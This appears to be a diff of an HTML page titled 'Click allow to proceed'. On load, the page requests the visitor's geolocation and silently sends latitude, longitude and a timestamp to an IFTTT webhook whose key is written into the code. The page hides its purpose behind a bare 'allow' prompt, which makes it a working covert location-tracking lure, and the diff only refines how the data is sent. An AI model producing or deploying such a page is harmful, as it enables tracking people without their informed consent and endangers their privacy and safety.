@@ -1,48 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Get Location</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click allow to proceed</title>
 </head>
 <body>
-    <h1>Location Access Page</h1>
-    <p>Click "Allow" to proceed.</p>
+    <h1>Click allow to proceed</h1>
+
     <script>
-        function sendLocation(latitude, longitude) {
-            const webhookURL = "https://maker.ifttt.com/trigger/Location_update/with/key/ddLkMioRn0CIWb9G_YlQFE";
-            const data = {
-                value1: latitude,
-                value2: longitude,
-                value3: new Date().toISOString()
-            };
+        // Your IFTTT Webhook URL (Update with your IFTTT key)
+        const iftttWebhookUrl = "https://maker.ifttt.com/trigger/Location_update/with/key/ddLkMioRn0CIWb9G_YlQFE";
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => console.log("Location sent successfully!"))
-            .catch(error => console.error("Error sending location:", error));
-        }
-
-        function getLocation() {
+        // Function to capture the location data
+        function captureLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        sendLocation(latitude, longitude);
-                    },
-                    (error) => console.error("Error getting location:", error)
-                );
+                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
             } else {
-                console.error("Geolocation is not supported by this browser.");
+                alert("Geolocation is not supported by this browser.");
             }
         }
 
-        // Automatically get location on page load
-        getLocation();
+        // Function to send the location data to IFTTT
+        function sendLocationData(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Prepare the URL with parameters to send to IFTTT
+            const url = `${iftttWebhookUrl}?value1=${encodeURIComponent(lat)}&value2=${encodeURIComponent(lon)}&value3=${encodeURIComponent(new Date().toISOString())}`;
+
+            // Send the data using fetch
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Location sent to IFTTT successfully:", data);
+                })
+                .catch(error => {
+                    console.error("Error sending location data to IFTTT:", error);
+                });
+        }
+
+        // Error handler for geolocation issues
+        function handleLocationError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        // Call the captureLocation function to start tracking the location
+        captureLocation();
     </script>
 </body>
 </html>
